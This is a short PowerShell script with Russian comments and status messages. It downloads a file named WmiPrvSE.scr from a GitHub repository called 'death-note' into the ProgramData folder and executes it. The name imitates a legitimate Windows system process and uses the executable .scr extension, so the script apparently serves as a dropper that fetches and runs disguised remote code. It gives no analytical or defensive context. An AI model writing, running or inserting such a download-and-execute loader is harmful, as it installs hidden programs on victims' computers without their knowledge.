$url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/WmiPrvSE.scr"
$output = "$env:programdata\WmiPrvSE.scr"

try {
    # Скачивание файла
    Write-Host "Загрузка файла..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
    
    # Проверка существования файла
    if (Test-Path $output) {
        Write-Host "Файл успешно загружен. Запуск..." -ForegroundColor Green
        
        # Запуск файла
        Start-Process -FilePath $output -Wait
    }
    else {
        Write-Host "Ошибка: файл не был загружен" -ForegroundColor Red
    }
}
catch {
    Write-Host "Ошибка при загрузке: $($_.Exception.Message)" -ForegroundColor Red
}